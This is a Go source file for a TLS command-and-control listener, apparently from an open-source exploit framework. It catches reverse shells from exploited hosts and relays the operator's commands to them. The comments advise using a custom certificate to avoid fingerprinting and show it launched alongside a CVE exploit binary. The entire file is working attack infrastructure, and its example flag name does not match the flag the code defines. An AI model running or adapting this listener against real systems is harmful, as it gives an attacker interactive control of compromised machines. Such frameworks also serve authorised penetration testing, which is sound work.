// sslshell is a simple c2 that listens for incoming ssl/tls connections in order to establish a reverse shell.
//
// The sslshell can generate it's own server certificate, or the user can provide their own. It's often a smart idea
// to provide unique certificate to avoid fingerprinting. To generate the required files you can use openssl:
//
//	openssl genpkey -algorithm RSA -out private_key.pem
//	openssl req -new -key private_key.pem -out csr.pem
//	openssl x509 -req -days 365 -in csr.pem -signkey private_key.pem -out certificate.pem
//
// The private_key.pem and certificate.pem are then provided on the command line like so:
//
//	./cve-2021-22205_linux-arm64 -e -sslShellServer.PrivateKeyFile private_key.pem -sslShellServer.ServerField certificate.pem ...
//
// If a certificate is not provide, this c2 will generate one on the fly, but it is likely vulnerable to fingerprinting.
//
// This c2 can accept multiple connections, but it currently can only handle interacting with one at a time.
package sslshell

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"flag"
	"fmt"
	"math/big"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/vulncheck-oss/go-exploit/output"
	"github.com/vulncheck-oss/go-exploit/random"
)

type Server struct {
	// The socket the server is listening on
	Listener net.Listener
	// The file path to the user provided private key (if provided)
	PrivateKeyFile string
	// The file path to the user provided certificate (if provided)
	CertificateFile string
}

var singleton *Server

// Get a singleton instance of the sslserver c2
func GetInstance() *Server {
	if singleton == nil {
		singleton = new(Server)
	}

	return singleton
}

// Create the flags for accepting custom TLS configurations
func (shellServer *Server) CreateFlags() {
	flag.StringVar(&shellServer.PrivateKeyFile, "sslShellServer.PrivateKeyFile", "", "A private key to use with the SSL server")
	flag.StringVar(&shellServer.CertificateFile, "sslShellServer.CertificateFile", "", "The certificate to use with the SSL server")
}

// Parses the user provided files or generates the certificate files and starts
// the TLS listener on the user provided IP/port
func (shellServer *Server) Init(ipAddr string, port int, isClient bool) bool {
	if isClient {
		output.PrintError("Called SSLShellServer as a client. Use lhost and lport.")

		return false
	}

	var ok bool
	var err error
	var certificate tls.Certificate
	if len(shellServer.CertificateFile) != 0 && len(shellServer.PrivateKeyFile) != 0 {
		certificate, err = tls.LoadX509KeyPair(shellServer.CertificateFile, shellServer.PrivateKeyFile)
		if err != nil {
			output.PrintfError("Error loading certificate: %s", err.Error())

			return false
		}
	} else {
		output.PrintStatus("Certificate not provided. Generating a TLS Certificate")
		certificate, ok = generateCertificate()
		if !ok {
			return false
		}
	}

	output.PrintfStatus("Starting TLS listener on %s:%d", ipAddr, port)
	shellServer.Listener, err = tls.Listen("tcp", fmt.Sprintf("%s:%d", ipAddr, port), &tls.Config{Certificates: []tls.Certificate{certificate}})
	if err != nil {
		output.PrintfError("Error loading certificate: %s", err.Error())

		return false
	}

	return true
}

// Listens for incoming SSL/TLS connections spawns a reverse shell handler for each new connection.
func (shellServer *Server) Run(timeout int) {
	// mutex for user input
	var cliLock sync.Mutex

	// track if we got a shell or not
	success := false

	// terminate the server if no shells come in within timeout seconds
	go func() {
		time.Sleep(time.Duration(timeout) * time.Second)
		if !success {
			output.PrintError("Timeout met. Shutting down shell listener.")
			shellServer.Listener.Close()
		}
	}()

	// Accept arbitrary connections. In the future we need something for the
	// user to select which connection to make active
	for {
		client, err := shellServer.Listener.Accept()
		if err != nil {
			if !strings.Contains(err.Error(), "use of closed network connection") {
				output.PrintError(err.Error())
			}

			return
		}
		success = true
		output.PrintfSuccess("Caught new shell from %v", client.RemoteAddr())
		go handleSimpleConn(client, &cliLock, client.RemoteAddr())
	}
}

func generateCertificate() (tls.Certificate, bool) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		output.PrintError(err)

		return tls.Certificate{}, false
	}

	template := x509.Certificate{
		SerialNumber:          big.NewInt(8),
		Subject:               pkix.Name{CommonName: random.RandLetters(12)},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(24 * time.Hour),
		BasicConstraintsValid: true,
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	certificateBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		output.PrintError(err)

		return tls.Certificate{}, false
	}

	certificate := tls.Certificate{
		Certificate: [][]byte{certificateBytes},
		PrivateKey:  privateKey,
	}

	return certificate, true
}

func handleSimpleConn(client net.Conn, cliLock *sync.Mutex, remoteAddr net.Addr) {
	// connections will stack up here. Currently that will mean a race
	// to the next connection but we can add in attacker handling of
	// connections latter
	cliLock.Lock()

	output.PrintfStatus("Active shell from %v", remoteAddr)
	buffReader := bufio.NewReader(client)
	for {
		// give the user a prompt and ask them for input
		fmt.Print("$ ")
		reader := bufio.NewReader(os.Stdin)
		userInput, _ := reader.ReadString('\n')
		_, writeError := client.Write([]byte(userInput))
		if writeError != nil {
			client.Close()
			output.PrintfError("Shell from %v terminated", remoteAddr)
			cliLock.Unlock()

			return
		}

		// this shell expect some type of response. give a high timeout on the
		// first read and a tight timeout on the remaining.
		wait := 10000
		for {
			err := client.SetReadDeadline(time.Now().Add(time.Duration(wait) * time.Millisecond))
			if err != nil {
				client.Close()
				output.PrintfError("Shell from %v terminated", remoteAddr)
				cliLock.Unlock()

				return
			}
			line, err := buffReader.ReadBytes('\n')
			if err != nil {
				if !strings.Contains(err.Error(), "i/o timeout") {
					client.Close()
					output.PrintfError("Shell from %v terminated", remoteAddr)
					cliLock.Unlock()

					return
				}

				break
			}
			fmt.Print(string(line))
			wait = 100
		}
	}
}
